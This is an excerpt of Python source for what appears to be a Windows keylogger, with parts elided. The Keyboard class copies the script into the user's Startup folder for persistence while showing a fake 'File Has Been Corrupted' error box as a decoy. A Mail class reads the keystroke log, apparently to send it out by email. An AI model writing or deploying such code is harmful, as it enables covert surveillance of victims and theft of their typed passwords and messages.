...
class Keyboard:
    ...
    def __init__(self):
        ...
        self.log_file='C:\\Users\\USER\\Desktop\\File.txt'
        #checks if the file already exists in the destination directory !
        self.file_path=f'C:\\Users\\{self.current_user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Whosit.py'
        if not os.path.isfile(self.file_path):
            ctypes.windll.user32.MessageBoxW(0, "Error !", "The File Has Been Corrupted !", 0x30)
            copyfile('./Whosit.py',self.file_path)
...
class Mail:
    ...
    def __init__(self):
        ...
        self.key_log = open(f'C:\\Users\\USER\\Desktop\\File.txt','rb')
